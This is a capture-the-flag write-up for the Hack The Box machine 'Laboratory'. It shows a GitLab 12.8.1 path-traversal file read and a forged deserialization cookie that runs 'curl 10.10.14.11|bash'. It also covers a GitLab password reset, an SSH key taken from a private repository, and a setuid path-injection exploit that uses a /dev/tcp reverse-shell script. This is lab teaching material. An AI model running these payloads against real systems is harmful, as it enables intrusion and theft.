---
layout: post
title: "Hack The Box - Laboratory Writeup"
author: Chr0x6eOs
date: "2021-04-17"
subject: "Laboratory Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Chr0x6eOs, Linux, GitLab, RCE, path-injection]
lang: "en"
image:
    path: assets/htb/Laboratory/logo.png
    width: 300
    height: 300
...

![Laboratory](/assets/htb/Laboratory/laboratory.png)

[Laboratory](https://www.hackthebox.eu/home/machines/profile/298) is an easy linux box by [0xc45](https://www.hackthebox.eu/home/users/profile/73268). 

### Overview

The box starts with web-enumeration, where we find an installation of GitLab 12.8.1. Researching for vulnerabilities, we find a arbitrary file-read vulnerability, which we turn into an RCE by leaking a secret. Using the secret we can sign cookies, which is exploitable as cookies are deserialized. Writing a deserialization payload into the cookie, we get a shell on the GitLab container.

Using the rails console we can reset the GitLab-password of Dexter and login as the user. Accessing Dexter's repositories, we get access to a ssh-key file we use to ssh into the machine and read user.txt.

Enumerating the system, we find an interesting setuid binary, which upon analysis is vulnerable to path-injection. Exploiting the path-injection we get a shell as root and can read root.txt.

## Information Gathering

### Nmap
We begin our enumeration with a nmap scan for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.216
Nmap scan report for 10.10.10.216
Host is up (0.17s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

The open ports shown are **22** (ssh), **80** (http) and **443** (https). Looking at the nmap-scan, we get a lot of interesting information. HTTP redirects to https, so for now we do not have to take a lot at port 80. From the HTTPS certificate, we get two hostnames `laboratory.htb` and `git.laboratory.htb`. Let us add both hostnames to our /etc/passwd file and start our enumeration with https.

### HTTPS - Port 443

Going to https://laboratory.htb, we get following page shown:

![Index webpage](/assets/htb/Laboratory/https/index-webpage.png)

Looking at the webpage, it seems to be only static content. Let us see, if the git hostname contains anything of interest.

Going to https://git.laboratory.htb, we get following page shown:

![GitLab login](/assets/htb/Laboratory/https/git-index.png)

Seems like we have a GitLab Community Edition installation running on the git VHost. Let us register an account and check out the available Git-Repositories.

![Registering an account](/assets/htb/Laboratory/https/git-register-1.png)

Upon registration, we get following error: `Email domain is not authorized for sign-up`.

![Registering with new mail-domain](/assets/htb/Laboratory/https/git-register-2.png)

Luckily, as we know the domain, we can easily bypass this filtering by registering an account with a `@laboratory.htb` email.

#### GitLab enumeration

After successful registration, let us start by looking for available repositories.

![Registering with new mail-domain](/assets/htb/Laboratory/https/git-explore.png)

Seems like  there is only one public repository available.

![Public repository](/assets/htb/Laboratory/https/git-public-repo.png)

The repository does not seem very interesting. Let us find out which version of GitLab is running, so we can search for public exploits.

The help page displays a version-info:

![Git Version](/assets/htb/Laboratory/https/git-version.png)

Seems like `GitLab Community Edition 12.8.1` is installed. Let us research for exploits next.

## Exploiting GitLab 12.8.1

### Exploit research

A [Google-search](https://www.google.com/search?q=gitlab+12.8.1+exploit) reveals that there is a [Metasploit module](https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/) available. However, more interestingly there is a [HackerOne report](https://hackerone.com/reports/827052) talking about arbitrary file-read. Let us try to reproduce the exploit on our target.

In order to exploit we have to do four steps:

1. Create two project

2. Create an issue with following payload as the description

   ```markdown
   ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
   ```

3. Move issue to other project

4. Download file

### Exploiting arbitrary file-read

Let us start by creating two repositories.

![Created two repos](/assets/htb/Laboratory/https/exploitation/git-created-repos.png)

Next, let us add an issue for Project1.

![Creating issue](/assets/htb/Laboratory/https/exploitation/git-create-issue.png)

Next, let us move the issue.

![Move issue](/assets/htb/Laboratory/https/exploitation/git-mv-issue.png)

We now move the issue to project2.

![Downloading /etc/passwd](/assets/htb/Laboratory/https/exploitation/git-file-download.png)

We successfully extract /etc/passwd from the system!

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
```

### Initial shell - RCE via deserialization attack

Further reading the [HackerOne article](https://hackerone.com/reports/827052), we can find the file-read vulnerability can be turned into RCE when leaking the `secret_key_base` from `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`. Using the key, we can create our own cookies that contain a deserialization payload.

In order to get RCE we have to do following steps:

1. Leak secret_key_base using file-read
2. Create a docker-instance of GitLab 12.8.1
3. Load secret_key_base in docker instance
4. Create cookie with RCE payload
5. Replace cookie and login
6. Get code-execution

Let us start by leaking the `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` file.

For this we redo the previous steps with this new payload:

```markdown
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
```

After redoing the steps to get the file, we can extract the secret_key_base:

```bash
root@darkness:~/Downloads# cat secrets.yml | grep secret_key_base
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
```

Next let us setup a GitLab 12.8.1 docker-instance.

First, let us download the right docker-image.

```bash
root@darkness:~# docker pull gitlab/gitlab-ee:12.8.1-ee.0
fe703b657a32: Pull complete
f9df1fafd224: Pull complete
a645a4b887f9: Pull complete
57db7fe0b522: Pull complete
b957f7604ce6: Pull complete
eec7830dd64f: Pull complete
f27723c14c7f: Pull complete
a96eab330bb8: Pull complete
9ccefb9c0a5d: Pull complete
e9e891db4b74: Pull complete
Digest: sha256:dbc399cb6bc84650a683f6f95e299a4b3af9c6b3adfada7aafdc60eb2e222ab3
Status: Downloaded newer image for gitlab/gitlab-ee:12.8.1-ee.0
docker.io/gitlab/gitlab-ee:12.8.1-ee.0
```

Next let us startup a docker-container, let it install and execute a shell in the container.

```bash
root@darkness:~# docker run -it gitlab/gitlab-ee:12.8.1-ee.0
[...INSTALLATION...]
root@darkness:~# docker exec -it a87efa8fd79b bash
root@a87efa8fd79b:/# 
```

Next, we have to overwrite the `secret_key_base` in the `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` file.

```bash
root@a87efa8fd79b:/# sed -i "s/secret_key_base: .*/secret_key_base: $SECRET_KEY_BASE/g" /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
```

Now let us start a rails console to forge our cookie:

```bash
root@a87efa8fd79b:/# gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1-ee (13bae744d5c) EE
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> 
```

Next we execute the payload:

```ruby
irb(main):001:0> request = ActionDispatch::Request.new(Rails.application.env_config)
=> #<ActionDispatch::Request:0x00007fe36d5d3b50
[...]
irb(main):002:0> request.env["action_dispatch.cookies_serializer"] = :marshal
=> :marshal
irb(main):003:0> cookies = request.cookie_jar
=> #<ActionDispatch::Cookies::CookieJar:0x00007fe36df55bb0
[...]
irb(main):004:0> erb = ERB.new("<%= `curl 10.10.14.11|bash` %>") # RCE payload
=> #<ERB:0x00007fe36c588d90 [...]
irb(main):005:0> depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 10.10.14.11 port 80: Connection refused
=> ""
irb(main):006:0> cookies.signed[:cookie] = depr
[...]
irb(main):007:0> puts cookies[:cookie] # Print cookie
BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiVyNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIDEwLjEwLjE0LjExfGJhc2hgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--9082496eb7908d8da233d501ad73a6d75a920281
=> nil
```

Now let us start our www-server to server a bash reverse-shell payload. I am going to use my [RevServ script](https://github.com/chr0x6eos/RevServ) to do so.

Now we simply have to issue a request with the cookie using curl to trigger the exploit.

```bash
root@darkness:~# curl -L -k "http://git.laboratory.htb/users/sign_in" -b "experimentation_subject_id=$COOKIE"
```

Checking our to our RevServ script, we successfully served the reverse-shell payload:

```bash
root@darkness:~# revserv

   _____  _            _  _                                                 
  / ____|| |          | || |                                                
 | (___  | |__    ___ | || |  ______   ___   ___  _ __ __   __ ___  _ __    
  \___ \ |  _ \  / _ \| || | |______| / __| / _ \|  __|\ \ / // _ \|  __|   
  ____) || | | ||  __/| || |          \__ \|  __/| |    \ V /|  __/| |      
 |_____/ |_| |_| \___||_||_|          |___/ \___||_|     \_/  \___||_|      
  _               _____  _             ___           __          ____       
 | |             / ____|| |           / _ \         / /         / __ \      
 | |__   _   _  | |     | |__   _ __ | | | |__  __ / /_    ___ | |  | | ___ 
 |  _ \ | | | | | |     |  _ \ |  __|| | | |\ \/ /|  _ \  / _ \| |  | |/ __|
 | |_) || |_| | | |____ | | | || |   | |_| | >  < | (_) ||  __/| |__| |\__ \\
 |_.__/  \__, |  \_____||_| |_||_|    \___/ /_/\_\ \___/  \___| \____/ |___/
          __/ |                                                             
         |___/                                                              

Twitter:    https://twitter.com/Chr0x6eOs
Github:     https://github.com/Chr0x6eOs
____________________________________________________________________________
    
[*] Serving bash-reverse-shell on 0.0.0.0:80...
[*] Served reverse-shell payload via http to 10.10.10.216!
```

Checking our netcat-listener, we successfully got a shell.

```bash
root@darkness:~# nc -lnvp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.216.
Ncat: Connection from 10.10.10.216:39056.
bash: cannot set terminal process group (395): Inappropriate ioctl for device
bash: no job control in this shell
git@git:~/gitlab-rails/working$
```

## Privesc - User

Now that we have our initial shell, let us enumerate the system to escalate our privileges to user.

### Overwriting GitLab password

As we are in a Docker-container, we do not have a lot of interesting data. Let us try to access Dexter's GitHub profile instead. As we do not know the password of Dexter, let us overwrite it using gitlab-rails console (as explained [here](https://docs.gitlab.com/12.10/ee/security/reset_root_password.html)). 

```bash
git@git:~/gitlab-rails/working$ gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> user = User.find_by(username: 'dexter')
=> #<User id:1 @dexter>
irb(main):002:0> user.password = 'Chronos@htb!'
=> "Chronos@htb!"
irb(main):003:0> user.save
Enqueued ActionMailer::DeliveryJob (Job ID: 835ea5c1-481b-473c-946e-989c9aa4ce9f) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007f089d881768 @uri=#<URI::GID gid://gitlab/User/1>>
=> true
```

Now that we have changed Dexter's password, let us login on GitLab.

![Login as dexter](/assets/htb/Laboratory/https/git-login.png)

After login, we get shown Dexter's projects.

![Dexter's projects](/assets/htb/Laboratory/https/git-repos.png)

The `SecureDocker` repository is private and according to the description may hold interesting information.

Let us clone the repository to take a better look at it.

```bash
root@darkness:~# git -c http.sslVerify=false clone https://git.laboratory.htb/dexter/SecureDocker
Cloning into 'SecureDocker'...
Username for 'https://git.laboratory.htb': dexter
Password for 'https://dexter@git.laboratory.htb': Chronos@htb!
warning: redirecting to https://git.laboratory.htb/dexter/SecureDocker.git/
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (10/10), done.
```

Let us see all available files:

```bash
root@darkness:~/SecureDocker# find . | grep -v .git
.
./dexter
./dexter/recipe.url
./dexter/.ssh
./dexter/.ssh/id_rsa
./dexter/.ssh/authorized_keys
./dexter/todo.txt
./README.md
```

Seems like we have an id_rsa ssh-key file! Let us use the key to login into the server using ssh.

```bash
root@darkness:~/SecureDocker/dexter/.ssh# ssh -i id_rsa dexter@laboratory.htb 
dexter@laboratory:~$
```

We successfully login via ssh and can now read user.txt.

```bash
dexter@laboratory:~$ cat user.txt 
89ff6***************************
```

## Privesc - Root

Now that we have user, let us enumerate the system to find a privesc-vector to root.

### Enumeration as user

After a bit of enumeration, I decided to search for setuid-binaries.

```bash
dexter@laboratory:~$ find / -user root -perm -4000 -exec ls -alh {} \; 2>/dev/null | grep -v snap
-rwsr-xr-x 1 root dexter 17K Aug 28 14:52 /usr/local/bin/docker-security
-rwsr-xr-x 1 root root 163K Jul 15  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 44K May 28  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 67K Apr  2  2020 /usr/bin/su
-rwsr-xr-x 1 root root 87K May 28  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 84K May 28  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 31K Aug 16  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39K Apr  2  2020 /usr/bin/umount
-rwsr-xr-x 1 root root 52K May 28  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 55K Apr  2  2020 /usr/bin/mount
-rwsr-xr-x 1 root root 67K May 28  2020 /usr/bin/passwd
[...]
```

The `docker-security` file seems very interesting.

### Reversing docker-security

In order to get a better understanding of the binary, let us do some static and dynamic analysis.

#### Static analysis using strings and Ghidra

Let us start our enumeration by downloading the binary and running strings on it.

```bash
root@darkness:~# strings docker-security
/lib64/ld-linux-x86-64.so.2
setuid
system  
__cxa_finalize
setgid
__libc_start_main
libc.so.6    
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH    
[]A\A]A^A_
chmod 700 /usr/bin/docker
chmod 660 /var/run/docker.sock
;*3$"                                                      
GCC: (Debian 10.1.0-6) 10.1.0 
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
docker-security.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
[...]
```

We can see four very interesting strings: `setuid`,  `system` and `chmod 700 /usr/bin/docker` and `chmod 660 /var/run/docker.sock`. We can already guess from these strings that setuid will be run. Furthermore, `system` (which executes shell commands) is executed. As we have two `chmod` commands, we can assume that system will be called with the two chmod-commands as arguments.

Let us further analyze the binary by opening it in hydra.

```c
void main(void)
{
  setuid(0);
  setgid(0);
  system("chmod 700 /usr/bin/docker");
  system("chmod 660 /var/run/docker.sock");
  return;
}
```

Looking at the main function in Ghidra, we can see that the binary does not have a lot of functionality. Even though we now know what the binary does, let us still use some dynamic analysis to get information about the binary.

#### Dynamic analysis using ltrace and strace

Let us analyze the binary using `ltrace` (which traces library calls) and `strace` (which traces system calls).

```bash
dexter@laboratory:~$ ltrace /usr/local/bin/docker-security 
setuid(0)                                                               = -1
setgid(0)                                                               = -1
system("chmod 700 /usr/bin/docker"chmod: changing permissions of '/usr/bin/docker': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                  = 256
system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                  = 256
+++ exited (status 0) +++
```

The ltrace confirms what we already know from our previous analysis. 

```bash
dexter@laboratory:~$ strace /usr/local/bin/docker-security
[...]
setuid(0)	= -1 EPERM (Operation not permitted)
setgid(0)	= -1 EPERM (Operation not permitted)
[...]
wait4(31523, chmod: changing permissions of '/usr/bin/docker': Operation not permitted
[...]
wait4(31525, chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
```

The strace gives us a lot more output than ltrace, however again gives a bit of information what is executed.

### Exploiting path-injection

You may already have spotted the vulnerability. If not, we have path-injection! Meaning that a binary is being called using relative paths. (In our case `chmod`). This vulnerability can be exploited easily.

In order to exploit path-injection we have to do following steps:

1. Create payload with same name as the target binary
2. Add location of payload in from of the path environment variable
3. Execute setuid binary
4. Wait for payload-execution

Let us start the exploitation by creating our payload file. For this, we can use any bash-command as a payload. I am going to use a bash reverse-shell, however there are other possibilities, such as writing an ssh-key to root's authorized_keys file.

```bash
dexter@laboratory:~$ echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.11/443 0>&1' > /tmp/chmod
dexter@laboratory:~$ cat /tmp/chmod 
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.11/443 0>&1
dexter@laboratory:~$ chmod +x /tmp/chmod
```

Next add the location of the payload (`/tmp`) to the path variable.

```bash
dexter@laboratory:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
dexter@laboratory:~$ export PATH=/tmp:$PATH
dexter@laboratory:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
```

Now we simply have to start a netcat listener and execute the docker-security binary.

```bash
dexter@laboratory:~$ /usr/local/bin/docker-security
```

Checking back to our listener, we successfully get a shell.

```bash
root@darkness:~# nc -vlnp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.216.
Ncat: Connection from 10.10.10.216:51082.
root@laboratory:~#
```

Now that we have a shell as root, we can read root.txt.

```bash
root@laboratory:/root# cat root.txt
f3a24***************************
```
